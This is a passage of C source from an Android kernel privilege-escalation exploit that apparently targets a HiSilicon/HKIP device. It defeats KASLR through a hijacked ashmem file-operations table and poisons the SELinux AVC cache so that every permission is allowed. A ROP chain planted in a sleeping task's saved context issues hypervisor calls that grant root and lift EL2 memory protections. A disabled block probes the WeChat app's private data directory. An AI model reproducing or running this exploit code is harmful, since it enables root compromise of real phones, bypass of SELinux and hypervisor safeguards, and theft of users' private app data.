  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

/*
 * One AVC poison pass (TASZK on Mate 40: "rewrote the AVC cache so the
 * decisions will allow anything to anybody -- this is not protected memory").
 *
 * Read the 512 slot heads, then for every candidate node:
 *   - validate the header with a PIPE read (direct map, no copy_*_user, so it
 *     cannot trip __check_object_size; a blind write already produced
 *     "kernel BUG at mm/usercopy.c:111" once),
 *   - set avd.allowed = ~0 (avc_has_perm does `bics wzr,w19,allowed`) and
 *     avd.auditdeny = 0 (no audit spam) at the offsets verified in target.h.
 *
 * Returns the number of nodes actually written.
 */
int avc_poison_pass(int fd, const char *tag) {
  uint64_t avc = 0;
  uintptr_t state = text_addr(SELINUX_ENFORCING);
  ssize_t ar = kernel_read_data(fd, state + SELINUX_STATE_AVC_OFF, &avc,
                                sizeof(avc));
  /*
   * Upper bound on a valid tclass, taken from the live policy class map
   * (measured 95 here).  Together with the bucket-hash test it drives the
   * chance of accepting a non-avc_node object down to ~1e-6; the observed
   *   usercopy: ... to SLUB object 'nsproxy' (offset 12, size 4)!
   * abort was exactly a stray object that happened to hash into the bucket.
   */
  uint32_t map_size = 0;
  {
    uint64_t policy = 0;
    if (kernel_read_data(fd, state + SELINUX_POLICY_OFF, &policy,
                         sizeof(policy)) == (ssize_t)sizeof(policy) &&
        policy >= 0xffffff8000000000ULL) {
      uint16_t ms = 0;
      if (kernel_read_data(fd, policy + SELINUX_POLICY_MAP_SIZE_OFF, &ms,
                           sizeof(ms)) == (ssize_t)sizeof(ms)) {
        map_size = ms;
      }
    }
  }
  if (map_size == 0 || map_size > 4096u) {
    map_size = 95u;
  }
  /*
   * Disable AVC node reclaim for the duration of the poison work.  The
   * threshold lives in plain .bss (avc+0), not in the EL2-protected policy
   * pool, and a 4-byte configfs write there cannot trip check_heap_object.
   * Without this the cache population churned 283..291 across six rounds and
   * the poisoned tuple was gone by the time the access was attempted.
   */
  {
    uint32_t big = 0x7fffffffu;
    kernel_write_data(fd, avc + AVC_CACHE_THRESHOLD_OFF, &big, sizeof(big));
  }
  uint32_t active_nodes = 0;
  uint32_t latest_notif = 0;
  kernel_read_data(fd, avc + AVC_CACHE_ACTIVE_NODES_OFF, &active_nodes,
                   sizeof(active_nodes));
  kernel_read_data(fd, avc + AVC_CACHE_LATEST_NOTIF_OFF, &latest_notif,
                   sizeof(latest_notif));
  static uint64_t slots[AVC_CACHE_SLOTS];
  ssize_t sr = -1;
  if (avc >= 0xffffff8000000000ULL) {
    sr = kernel_read_data(fd, avc + AVC_SLOTS_OFF, slots, sizeof(slots));
  }
  int nodes = 0;
  int wrote = 0;
  int bad = 0;
  int confirmed = 0;
  if (sr == (ssize_t)sizeof(slots)) {
    uint32_t allow_all = 0xffffffffu;
    uint32_t zero32 = 0;
    for (int i = 0; i < AVC_CACHE_SLOTS; i++) {
      uint64_t entry = slots[i];
      uint64_t expect = avc + AVC_SLOTS_OFF + (uint64_t)i * 8;
      /*
       * Walk the whole bucket, not just its head.  avc_cache.slots[] is an
       * hlist: measured active_nodes=510..516 against only 281..284 bucket
       * heads, i.e. ~45% of live nodes sat behind another node in a chain and
       * were never poisoned.  A denied tuple whose node happens to be one of
       * those stays denied, which looks exactly like "AVC poisoning does not
       * work" -- so cover the chain before drawing that conclusion.
       */
      for (int hop = 0; hop < 16; hop++) {
        if (entry < 0xffffff8000001000ULL ||
            entry >= 0xffffff8200000000ULL) {
          break;
        }
        uint64_t node = entry - AVC_NODE_LIST_OFF;
        /*
         * hlist integrity check.  Following node->list.next blindly would let a
         * wrong AVC_NODE_LIST_OFF -- or a half-torn chain -- manufacture a bogus
         * "node" address, and this loop then writes 0xffffffff there.  That is
         * exactly the usercopy-BUG class documented below, so the chain walk
         * needs its own guard: hlist_node.pprev must point back at the pointer
         * that links us -- &slots[i] for a bucket head, &prev->list.next (i.e.
         * prev_node + AVC_NODE_LIST_OFF) for a chain member.  With the pprev
         * test a false positive is impossible rather than ~1/512 per candidate.
         */
        uint64_t pprev = 0;
        if (!pipe_phys_read_data(
                fd, node + AVC_NODE_LIST_OFF + 8, &pprev, sizeof(pprev))) {
          bad++;
          break;
        }
        if (pprev != expect) {
          bad++;
          break;
        }
        uint32_t hdr[4] = {0};
        if (!pipe_phys_read_data(fd, node, hdr, sizeof(hdr))) {
          bad++;
          break;
        }
        uint32_t ssid = hdr[0];
        uint32_t tsid = hdr[1];
        uint32_t tclass = hdr[2] & 0xffffu;
        /*
         * avc_lookup only ever links a node into slots[h] with
         *   eor w10,w1,w2,lsl#2 ; eor w10,w10,w3,lsl#4 ; and w10,w10,#0x1ff
         * so a slot entry whose contents do not hash back to its OWN bucket is
         * not an avc_node.  Without this check the range test alone let a stray
         * kernel pointer through and the 4-byte write at +0x0c landed elsewhere;
         * measured abort text:
         *   usercopy: Kernel memory overwrite attempt detected to SLUB object
         *   'nsproxy' (offset 12, size 4)!
         * Checking the hash makes a false positive ~1/512 instead of near-certain
         * for a small-integer object header.
         */
        uint32_t h = (ssid ^ (tsid << 2) ^ (tclass << 4)) & 0x1ffu;
        if (ssid == 0 || ssid > 200000u || tsid == 0 || tsid > 200000u ||
            tclass == 0 || tclass > map_size || h != (uint32_t)i) {
          bad++;
          break;
        }
        nodes++;
        /*
         * Use the pipe writer, NOT configfs.  This is a hard requirement, not a
         * preference: configfs goes through copy_from_user ->
         * __check_object_size -> check_heap_object, and if `node` is not exactly
         * the start of a SLUB object the kernel takes
         *   usercopy: Kernel memory overwrite attempt detected to SLUB object
         *   'nsproxy' (offset 12, size 4)!
         *   kernel BUG at mm/usercopy.c:111
         * i.e. an unrecoverable BUG/reboot (measured twice, once with zero device
         * polling, so it is not a perturbation artefact).  pipe_phys_write_data
         * never calls copy_*_user, so it cannot reach that BUG, and it resolves
         * the address with the same direct_to_page() the validation read above
         * used -- so the check and the write agree by construction.
         * Whether the write actually lands is answered by `confirmed` below.
         */
        if (!pipe_phys_write_data(fd, node + AVC_NODE_ALLOWED_OFF, &allow_all,
                                  sizeof(allow_all))) {
          break;
        }
        pipe_phys_write_data(fd, node + AVC_NODE_AUDITDENY_OFF, &zero32,
                             sizeof(zero32));
        /*
         * Self-verify with the read primitive that just validated this node.
         * This is what separates the three possible outcomes instead of guessing:
         *   confirmed==wrote  -> the mask is really in the kernel, so a later
         *                        "Permission denied" means eviction or a
         *                        different tuple, not a broken write path;
         *   confirmed<wrote   -> the write does not land and the primitive is
         *                        the problem.
         */
        {
          uint32_t chk[4] = {0};
          if (pipe_phys_read_data(fd, node, chk, sizeof(chk)) &&
              chk[3] == 0xffffffffu) {
            confirmed++;
          }
        }
        wrote++;
        uint64_t next = 0;
        if (!pipe_phys_read_data(
                fd, node + AVC_NODE_LIST_OFF + AVC_NODE_NEXT_OFF, &next,
                sizeof(next))) {
          break;
        }
        entry = next;
        expect = node + AVC_NODE_LIST_OFF;
      }
    }
  }
  pr_info("avc[%s] avc=%016llx ar=%zd sr=%zd map=%u nodes=%d wrote=%d "
          "confirmed=%d bad=%d active=%u notif=%u\n",
          tag, (unsigned long long)avc, ar, sr, map_size, nodes, wrote,
          confirmed, bad, active_nodes, latest_notif);
  return wrote;
}

/*
 * Route C: lift the EL2 read-only protection on the SELinux PRMEM pool by
 * making the kernel call hkip_unregister_ro_mod(va_start, va_size).
 *
 * Control flow is taken over by rewriting a sleeping child's
 * thread.cpu_context.  When it is woken, cpu_switch_to restores our x19..x28,
 * x29, sp and x30 and `ret`s into a three-segment chain that runs on the
 * victim's OWN kernel stack:
 *
 *   1. entry gadget  saves the incoming x0 (== prev, the task being switched
 *      away) and reloads x19/x29/x30;
 *   2. menu_select tail (`ldp x1,x2,[sp,#0x10] ; mov x0,x19 ; ... ; blr x25`)
 *      calls hkip_unregister_ro_mod(x0 = va_start, x1 = va_size) -- the wrapper
 *      issues the HVC itself, so we never touch HVC dispatch directly;
 *   3. final gadget reloads x0 == prev, reinstates the victim's original
 *      x23..x28, and restores sp to the original cpu_context.sp with
 *      x30 = __switch_to+0x210, so __switch_to's own epilogue runs and
 *      __schedule+0x908 calls finish_task_switch(x0 = prev) with a consistent
 *      rq->curr.  The victim then returns to pause() normally.
 *
 * Nothing here goes through copy_*_user, so it cannot trip check_heap_object.
 * Every precondition is validated first; on any mismatch the stage is skipped
 * (no panic) and the reason is logged.
 */
/*
 * Issue exactly one HKIP HVC from kernel context: op in x0, a1 in x1, a2 in x2.
 *
 * The call primitive (menu_select tail) gives us all three -- `mov x0,x19`,
 * `ldp x1,x2,[sp,#0x10]` -- then `blr x25` into the `hvc #0 ; ret` gadget, so EL2
 * performs the operation itself.  That matters because set_prmem_ro() clears
 * PTE_WRITE in the EL1 tables: no data write into a prmem page can land from EL1,
 * only an EL2-performed store can.
 *
 * Returns 0 only if the armed cpu_context was visibly consumed by the victim.
 */
static int hvc_inject(int fd, uint64_t target, uint64_t op, uint64_t a1,
                      uint64_t a2, uint64_t guard, uintptr_t x22,
                      const char *tag) {
  pid_t victim = fork();
  if (victim == 0) {
    for (;;) {
      pause();
    }
  }
  if (victim < 0) {
    pr_info("%s fork failed\n", tag);
    return -1;
  }
  usleep(60000);

  uint64_t task = find_task_by_tgid(fd, (uint32_t)victim);
  if (!is_direct_ptr(task)) {
    pr_info("%s no task pid=%d\n", tag, victim);
    kill(victim, SIGKILL);
    waitpid(victim, NULL, 0);
    return -1;
  }
  uintptr_t cc = task + TASK_CPU_CONTEXT_OFF;
  uint64_t saved_cc[13];
  int saved_ok = 1;
  for (int i = 0; i < 13; i++) {
    saved_cc[i] = 0;
    if (!pipe_phys_read_data(fd, cc + (uint64_t)i * 8, &saved_cc[i], 8)) {
      saved_ok = 0;
    }
  }
  uint64_t osp = saved_cc[CPU_CTX_SP_OFF / 8];
  uint64_t orig_x30 = saved_cc[CPU_CTX_X30_OFF / 8];
  uint64_t frame_x30 = 0;
  int frame_ok = saved_ok && is_direct_ptr(osp) && (osp & 7) == 0 &&
                 (osp & (PAGE_SIZE - 1)) >= HVC_STACK_FRAME_SIZE &&
                 pipe_phys_read_data(fd, osp + 8, &frame_x30, 8) &&
                 frame_x30 == text_addr(KIMAGE_TEXT_BASE + SCHED_FINISH_TS_OFF);
  if (orig_x30 != text_addr(KIMAGE_TEXT_BASE + SWITCH_RESUME_OFF) || !frame_ok) {
    pr_info("%s preflight osp=%016llx x30=%016llx ret=%016llx\n", tag,
            (unsigned long long)osp, (unsigned long long)orig_x30,
            (unsigned long long)frame_x30);
    kill(victim, SIGKILL);
    waitpid(victim, NULL, 0);
    return -1;
  }

  /* Chain in [osp-0x150, osp): entry frame, menu_select frame, final frame.
   * x23..x28 must be the victim's originals -- __switch_to restores x19..x22 only. */
  uint64_t base = osp - HVC_STACK_FRAME_SIZE;
  uint64_t ms = base + HVC_STACK_MS_OFF;
  uint64_t fin = base + HVC_STACK_FINAL_OFF;
  uint64_t slot;
  int st = 0;
  const int st_want = 19;
  slot = ms + 0x10;
  st += pipe_phys_write_data(fd, base + 0x00, &slot, 8) ? 1 : 0;
  slot = text_addr(KIMAGE_TEXT_BASE + HVC_CHAIN_GADGET_OFF);
  st += pipe_phys_write_data(fd, base + 0x08, &slot, 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, base + 0x10, &op, 8) ? 1 : 0; /* x0 */
  st += pipe_phys_write_data(fd, ms + 0x08, &guard, 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, ms + 0x10, &a1, 8) ? 1 : 0;   /* x1 */
  st += pipe_phys_write_data(fd, ms + 0x18, &a2, 8) ? 1 : 0;   /* x2 */
  slot = 1;
  st += pipe_phys_write_data(fd, ms + 0x30, &slot, 8) ? 1 : 0;
  slot = text_addr(KIMAGE_TEXT_BASE + HVC_FINAL_GADGET_OFF);
  st += pipe_phys_write_data(fd, ms + 0x68, &slot, 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x18, &orig_x30, 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x20, &saved_cc[9], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x28, &saved_cc[8], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x30, &saved_cc[7], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x38, &saved_cc[6], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x40, &saved_cc[5], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x48, &saved_cc[4], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x50, &saved_cc[3], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x58, &saved_cc[2], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x60, &saved_cc[1], 8) ? 1 : 0;
  st += pipe_phys_write_data(fd, fin + 0x68, &saved_cc[0], 8) ? 1 : 0;
  if (st != st_want) {
    pr_info("%s fill %d/%d\n", tag, st, st_want);
    kill(victim, SIGKILL);
    waitpid(victim, NULL, 0);
    return -1;
  }

  uint64_t cc_x19 = base + HVC_STACK_STORE_BASE;
  uint64_t cc_x29 = ms + 0x10;
  uint64_t entry = text_addr(KIMAGE_TEXT_BASE + HVC_ENTRY_STORE_GADGET_OFF);
  int ok = 0;
  ok |= pipe_phys_write_data(fd, cc + CPU_CTX_X19_OFF, &cc_x19, 8) ? 1 : 0;
  ok |= pipe_phys_write_data(fd, cc + CPU_CTX_X22_OFF, &x22, 8) ? 2 : 0;
  ok |= pipe_phys_write_data(fd, cc + CPU_CTX_X25_OFF, &target, 8) ? 4 : 0;
  ok |= pipe_phys_write_data(fd, cc + CPU_CTX_X29_OFF, &cc_x29, 8) ? 8 : 0;
  ok |= pipe_phys_write_data(fd, cc + CPU_CTX_SP_OFF, &base, 8) ? 16 : 0;
  ok |= pipe_phys_write_data(fd, cc + CPU_CTX_X30_OFF, &entry, 8) ? 32 : 0;
  if (ok != 63) {
    for (int i = 0; i < 13; i++) {
      pipe_phys_write_data(fd, cc + (uint64_t)i * 8, &saved_cc[i], 8);
    }
    pr_info("%s ccw %d/63 rolled back\n", tag, ok);
    kill(victim, SIGKILL);
    waitpid(victim, NULL, 0);
    return -1;
  }
  pr_info("%s armed pid=%d op=%08llx a1=%016llx a2=%016llx osp=%016llx\n", tag,
          victim, (unsigned long long)op, (unsigned long long)a1,
          (unsigned long long)a2, (unsigned long long)osp);

  kill(victim, SIGUSR1);
  usleep(150000);
  /* Consumed?  If the armed values are untouched the victim never ran our context,
   * so roll the real cpu_context back; otherwise the CPU already re-saved it and
   * writing saved_cc back would corrupt a healthy task. */
  uint64_t nx19 = 0, nsp = 0, nx30 = 0;
  int armed =
      pipe_phys_read_data(fd, cc + CPU_CTX_X19_OFF, &nx19, 8) &&
      pipe_phys_read_data(fd, cc + CPU_CTX_SP_OFF, &nsp, 8) &&
      pipe_phys_read_data(fd, cc + CPU_CTX_X30_OFF, &nx30, 8) &&
      nx19 == cc_x19 && nsp == base && nx30 == entry;
  if (armed) {
    for (int i = 0; i < 13; i++) {
      pipe_phys_write_data(fd, cc + (uint64_t)i * 8, &saved_cc[i], 8);
    }
  }
  kill(victim, SIGKILL);
  waitpid(victim, NULL, 0);
  pr_info("%s done consumed=%d\n", tag, armed ? 0 : 1);
  return armed ? -1 : 0;
}

/*
 * Clear the HKIP decision byte that security_compute_av consults:
 *   ldr x9,[x0,#8] ; ldarb w9,[x9] ; tbnz w9,#0,normal
 *   (bit0==0 -> avd->allowed = 0xffffffff, i.e. every AVC miss allows everything)
 * selinux_state+8 is a POINTER, so the byte is *(selinux_state+8), living in
 * selinux_prot_pool's single 4K node.  That node is registered plain RO
 * (hkip_register_ro), and ROWM_WRITE_8 against it is silently refused -- measured
 * with both 0xC6001054 and 0xC600105A, no panic, byte unchanged.  So first convert
 * the page to ROWM, then write.
 */
/*
 * Main route: make SELinux's own policy memory modifiable, the way TASZK did.
 *
 * selinux_pool is PRMEM_RO_RECL, so it is registered with hkip_register_ro_mod and
 * HKIP_HVC_RO_MOD_UNREGISTER (0xC6001033) is the matching release call -- unlike
 * selinux_prot_pool (RO_NO_RECL), where ROWM_WRITE_8/ROWM_CLEAR_8 and
 * ROWM_REGISTER+ROWM_WRITE_8 were all silently refused (measured).
 *
 * Releasing EL2 is not enough on its own: lock_range() also clears PTE_WRITE in the
 * EL1 tables (set_prmem_ro), and only the kernel's own unlock_range() puts it back
 * with set_prmem_rw().  So we must call set_memory_rw() ourselves -- that is why the
 * injector now takes the call target as a parameter.
 *
 * Every step logs before it acts, so a failure is attributable rather than a bare
 * panic, and the data write only happens when a node really covers the target.
 */
static int hvc_unprotect_pool(int fd) {
  /*
   * DISABLED -- structurally impossible, not a tuning problem.
   *
   * The gate byte *(selinux_state+8) lives in selinux_prot_pool, which is the
   * first pool of the linker section, i.e. PRMEM_RO_NO_RECL.  prmem.c's
   * unprotect_range() dispatches only on WR_RECL and RO_RECL and does `return`
   * for every other type, so there is no HVC that can lift a RO_NO_RECL pool.
   * Measured with build 9AED878B: both injections ran (unreg consumed=1,
   * rw consumed=1) and the plain data write to the gate byte still panicked;
   * the byte stays 0x01 (bit0=1 = normal policy lookup).
   *
   * The unregisterable pool is selinux_pool (offset 0x36D01A0, RO_RECL), and the
   * remaining SELinux route is to borrow an app's SID on the cred instead.
   */
  (void)fd;
  return 0;
}

/*
 * Route D: put the CALLING thread into hkip_uid_root_bits.
 *
 * hkip_check_uid_root() (drivers_hisi_hhee_hkip_critdata.c:57) gates the
 * capability checks the kernel makes for us: it returns 0 only while the
 * calling task's bitmap entry is set, and otherwise force_sig(SIGKILL)s a task
 * whose creds merely look root.  Cred memory written by hand never reaches
 * commit_creds(), so that entry stays clear.
 *
 * The bitmap is registered with HKIP_HVC_ROWM_REGISTER, so EL2 owns it and the
 * kernel itself only writes it through hkip_set_bit() -> hvc #0.  We emit the
 * same HVC from kernel context.  ROWM_SET_BIT needs the value in x3, which this
 * chain cannot set, so ROWM_WRITE_8 is used: (dst,val) in x1/x2, and ROWM is
 * exactly the range type it accepts.
 *
 * Three measured corrections, each from a real run:
 *  1. Index by tid.  hkip_get_task_bit() uses task_pid_nr(); getpid() is the
 *     tgid.  First version wrote the tgid word: bit read back set, setuid(0)
 *     still EPERM, every syscall still on an unblessed thread.
 *  2. Do not walk min..max.  Thread ids are sparse (tasks=3, span=17590..28522);
 *     a min-to-max walk covered 17552..18015 and missed the caller.
 *  3. Emit exactly ONE HVC.  Two back-to-back injections reported consumed=1
 *     twice but shared the same victim stack (`osp` identical) and left the
 *     caller's byte 0x00.  A single injection is the shape that measured
 *     00->ff for the calling thread.
 */
/*
 * Issue one arbitrary HKIP HVC from kernel context (same primitive the uid-bit
 * registration uses).  RO_MOD_UNREGISTER needs (va_start, va_size) in x1/x2,
 * which hvc_inject() can set.
 */
int hvc_call(int fd, uint64_t op, uint64_t a1, uint64_t a2, const char *tag) {
  uint64_t guard = 0;
  if (kernel_read_data(fd, text_addr(KIMAGE_TEXT_BASE + STACK_CHK_GUARD_OFF),
                       &guard, sizeof(guard)) != (ssize_t)sizeof(guard) ||
      guard == 0) {
    pr_info("%s guard read failed\n", tag);
    return 0;
  }
  if (fake_task == 0) {
    pr_info("%s: no planted page\n", tag);
    return 0;
  }
  uintptr_t x22 = (fake_task - FAKE_TASK_OFF) + HVC_RO_PTR_OFF;
  int inj = hvc_inject(fd, text_addr(KIMAGE_TEXT_BASE + HVC_HVC0_GADGET_OFF),
                       op, a1, a2, guard, x22, tag);
  usleep(50000);
  pr_info("%s op=%llx a1=%016llx a2=%016llx inj=%d\n", tag,
          (unsigned long long)op, (unsigned long long)a1,
          (unsigned long long)a2, inj);
  return inj;
}

int hvc_grant_uid_bit(int fd, unsigned long tid) {
  uint64_t guard = 0;
  if (kernel_read_data(fd, text_addr(KIMAGE_TEXT_BASE + STACK_CHK_GUARD_OFF),
                       &guard, sizeof(guard)) != (ssize_t)sizeof(guard) ||
      guard == 0) {
    pr_info("uidbit guard read failed\n");
    return 0;
  }
  if (fake_task == 0) {
    pr_info("uidbit: no planted page\n");
    return 0;
  }
  uintptr_t x22 = (fake_task - FAKE_TASK_OFF) + HVC_RO_PTR_OFF;
  uintptr_t map = text_addr(HKIP_UID_ROOT_BITS);

  unsigned long me = tid;
  /*
   * BYTE address, not word-aligned.  Measured (build 1211B12E, run sel14):
   *   uidbit tid=17551 at=...0890 rb=1/1 00->00 want=80 ok=0
   *   word=00000000000000ff
   * i.e. HKIP_HVC_ROWM_WRITE_8 wrote exactly ONE byte -- 0xff -- at dst and left
   * the other seven alone (the "8" is 8 bits, not 8 bytes).  The caller's byte
   * sat at word+1 and stayed 0x00.  That single fact explains every earlier
   * contradiction: fs1 (byte at word+0) saw 00->ff, tw15 (word+4) saw 00->00.
   * So target the caller's own byte directly; alignment is whatever EL2
   * tolerates, which this run measures.
   */
  uintptr_t at = map + (me >> 3);
  uint8_t before = 0xAA;
  int rb0 = kernel_read_data(fd, at, &before, 1) == 1;

  uint64_t all = 0xffffffffffffffffULL;
  int inj = hvc_inject(fd, text_addr(KIMAGE_TEXT_BASE + HVC_HVC0_GADGET_OFF),
                       HKIP_HVC_ROWM_WRITE_8, at, all, guard, x22, "uidbit");
  usleep(50000);

  uint8_t ours = 0;
  int rb = kernel_read_data(fd, at, &ours, 1) == 1;
  /*
   * Also read back the WHOLE word.  Two runs of this exact primitive disagree:
   * fs1 measured 00->ff with the caller's byte at word+0, tw15 measured 00->00
   * with it at word+4, both with consumed=1.  Reading all 8 bytes separates
   * "the HVC did nothing" (still zero) from "it wrote only a prefix" (first
   * bytes changed) instead of guessing which.
   */
  uint64_t wv = 0;
  int rbw = kernel_read_data(fd, at, &wv, sizeof(wv)) == (ssize_t)sizeof(wv);
  uint32_t want = 1u << (me & 7u);
  pr_info("uidbit tid=%lu at=%016llx inj=%d rb=%d/%d %02x->%02x want=%02x "
          "ok=%d word=%016llx\n",
          me, (unsigned long long)at, inj, rb0, rb, before, ours, want,
          rb && (ours & want) != 0, (unsigned long long)(rbw ? wv : 0));
  return rb && (ours & want) != 0;
}
/* Register the calling thread (the exploit's own child) as a legitimate root
 * task, as before.  hvc_grant_uid_bit() above is the same primitive with the
 * tid as a parameter, which is what lets the gate bless an arbitrary process. */
int hvc_grant_uid_root(int fd) {
  return hvc_grant_uid_bit(fd, (unsigned long)syscall(SYS_gettid));
}
int install_child_root(int fd) {
  /*
   * L5 is NOT done here any more.  Running it before the pipe stage needs the
   * configfs fallback for linear-map addresses, and that oopses the process
   * (proved by landing c3/c35: kimage alias reads fine, the very next linear
   * read of task+0x640 kills it).  L5 now runs post-pipe inside
   * install_android_root(), where pipe_phys_read_data handles linear.
   */
  if (!install_pipe_physrw(fd)) {
    return 0;
  }
  hvc_unprotect_pool(fd);
  hvc_grant_uid_root(fd);
  /*
   * AVC poisoning inside the hijack window.
   * TASZK on Mate 40: "I first rewrote the AVC cache so the decisions will
   * allow anything to anybody (this is not protected memory)."
   *
   * Layout verified from this image (avc_lookup 0xffffffc0109bdff8 and
   * avc_has_perm 0xffffffc0109bf778):
   *   slots[] at avc+0x8, slot holds &node->list, node = entry - 0x28,
   *   ae.avd.allowed at node+0x0c (node+0x1c is seqno), *(entry) == list.next.
   */
  {
    static const char *appdir = "/data/data/com.tencent.mm";
    /*
     * A denied check short-circuits at the first failing permission, so each
     * probe only unlocks the next one (dir:search first, then dir:read, ...).
     * The probe that finally succeeds is itself the one whose denial must be
     * covered too, so poison AFTER every probe and keep probing until the
     * listing actually yields an entry.  Measured without this: three rounds
     * then a final listing left "entry=" empty and open=-1.
     */
    /*
     * Disabled for the routed runs: this six-round probe-then-poison loop is the
     * app-data experiment, and it is already measured negative at full AVC
     * coverage (790/790 nodes, confirmed==wrote, /data/data still EACCES -- see
     * ROUND_INITDOM_2026-11-11.md).  The probe in install_android_root() does its
     * own trigger -> poison -> retry on the tuples that matter for the current
     * goal, so keeping this loop only costs code size and blurs attribution.
     */
#if 0
    char nm[64] = {0};
    int nm_is_dir = 0;
    for (int round = 0; round < 6 && nm[0] == 0; round++) {
      int pfd = open(appdir, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
      if (pfd >= 0) {
        DIR *pd = fdopendir(pfd);
        struct dirent *pde = pd ? readdir(pd) : NULL;
        while (pde && (strcmp(pde->d_name, ".") == 0 ||
                       strcmp(pde->d_name, "..") == 0)) {
          pde = readdir(pd);
        }
        if (pde) {
          strncpy(nm, pde->d_name, sizeof(nm) - 1);
          nm_is_dir = (pde->d_type == DT_DIR);
        }
        if (pd) {
          closedir(pd);
        } else {
          close(pfd);
        }
      }
      avc_poison_pass(fd, "dir");
    }

    char target[192] = {0};
    if (nm[0]) {
      snprintf(target, sizeof(target) - 1, "%s/%s", appdir, nm);
      int tf = open(target, O_RDONLY | O_CLOEXEC);
      if (tf >= 0) {
        close(tf);
      }
      avc_poison_pass(fd, "file");
    }

    /* The deliverable of this pass: can a shell-domain process now read it? */
    int rf = -1;
    int rerr = 0;
    ssize_t rd = -1;
    char buf[64] = {0};
    if (target[0]) {
      rf = open(target, O_RDONLY | O_CLOEXEC);
      rerr = errno;
      if (rf >= 0) {
        rd = read(rf, buf, sizeof(buf) - 1);
        close(rf);
      }
    }
    pr_info("avc result dir=%s entry=%s isdir=%d open=%d errno=%d rd=%zd "
            "data=%s\n",
            appdir, nm, nm_is_dir, rf, rerr, rd, buf);
#endif /* app-data probe loop, disabled */

    uint64_t orig = canon_addr(ASHMEM_FOPS);
    ssize_t fr = 0;
    /*
     * KEEP_FOPS leaves the ashmem fake table installed across
     * install_android_root().  avc_poison() reaches the AVC only through
     * configfs_read/write_once, which route through that fake f_op, so the
     * "trigger -> poison -> retry" experiment inside the root stage is
     * impossible after this restore.  Probe runs set it; normal runs keep the
     * restore so the hijacked table does not outlive the exploit.
     */
    if (!getenv("KEEP_FOPS")) {
      fr = configfs_write_once(fd, text_addr(ASHMEM_MISC_FOPS), &orig,
                               sizeof(orig));
    }
    /* "root fops restore" print dropped 2026-11-12 for size; the restore itself
     * is unchanged and its result is folded into fr. */
    (void)fr;
  }
  return install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

#ifdef PSELECT_WAITER_LAYOUT_5_10
  uintptr_t misc_fops = text_addr(ASHMEM_MISC_FOPS);
#else
  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
#endif
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  fops_before = pre_fops;
  pr_info("cfi pre-check rb=%zd fops=%016llx want=%016zx errno=%d\n",
          pre_rb, (unsigned long long)pre_fops, fake_fops, errno);
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  /*
   * Do NOT restore ashmem_misc.fops here.
   *
   * Tried it (measurably): pre-check -> restore -> cfi write/read and the
   * llseek repair all still pass, but the chain then dies before the pipe
   * stage (summary done=0, no "phys step" lines at all).  The verification
   * writes are followed by restore_slide_boot_id() and leak_kernel_base(),
